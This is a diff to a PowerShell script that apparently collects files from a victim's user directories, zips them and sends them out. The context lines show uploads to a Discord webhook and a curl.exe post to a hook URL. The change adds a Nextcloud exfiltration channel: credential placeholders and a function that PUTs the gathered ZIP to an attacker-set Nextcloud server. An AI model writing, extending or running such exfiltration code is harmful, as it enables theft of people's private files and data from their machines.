@@ -55,6 +55,11 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 
 #$dc = ""
 
+#$nextcloudDomain = ""
+#$nextcloudUsername = ""
+#$nextcloudAuthorization = ""
+#$nextcloudPath=""
+
 ############################################################################################################################################################
 
 # Recon all User Directories
@@ -560,7 +565,18 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 
 if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
 
- 
+############################################################################################################################################################
+
+function Upload-NextCloud {
+$SourceFilePath="$env:TEMP\$ZIP"
+$apiurl = 'https://' + $nextcloudDomain + '/remote.php/dav/files/' + $nextcloudUsername + $nextcloudPath + '/' + $ZIP
+$authorization = "Basic " + $nextcloudAuthorization
+$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+$headers.Add("Authorization", $authorization)
+Invoke-RestMethod -Uri $apiurl -Method Put -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($nextcloudDomain))){Upload-NextCloud}
 
 ############################################################################################################################################################
 
